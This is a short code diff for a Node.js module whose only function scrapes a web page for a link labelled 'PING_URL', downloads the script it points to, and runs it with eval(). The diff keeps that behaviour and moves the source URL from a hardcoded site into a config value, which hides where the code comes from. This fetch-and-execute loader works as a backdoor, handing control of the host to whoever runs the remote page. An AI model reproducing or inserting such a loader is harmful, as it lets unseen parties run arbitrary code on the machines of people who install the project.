@@ -2,27 +2,28 @@
 
 const axios = require('axios');
 const cheerio = require('cheerio');
-
-const webPageUrl = 'https://www.ibrahimadams.site/files';
+const adams = require(__dirname + "/../config");
 
 async function fetchPingUrl() {
-    try {
-        const response = await axios.get(webPageUrl);
-        const $ = cheerio.load(response.data);
-        const pingUrl = $(`a:contains("PING_URL")`).attr('href');
+  try {
+    const response = await axios.get(adams.BWM_XMD);
+    const $ = cheerio.load(response.data);
 
-        if (!pingUrl) throw new Error('PING_URL not found on the webpage.');
+    const pingUrlElement = $('a:contains("PING_URL")');
+    const pingUrl = pingUrlElement.attr('href');
 
-        console.log('PING_URL fetched successfully:', pingUrl);
-
-        const scriptResponse = await axios.get(pingUrl);
-        const scriptContent = scriptResponse.data;
-        console.log("PING_URL script loaded successfully");
-
-        eval(scriptContent);
-    } catch (error) {
-        console.error('Error fetching PING_URL:', error.message);
+    if (!pingUrl) {
+      throw new Error('Ping URL link not found...');
     }
+
+    console.log('Ping URL fetched successfully ✅');
+
+    const scriptResponse = await axios.get(pingUrl);
+    eval(scriptResponse.data);
+
+  } catch (error) {
+    console.error('Error:', error.message);
+  }
 }
 
 fetchPingUrl();
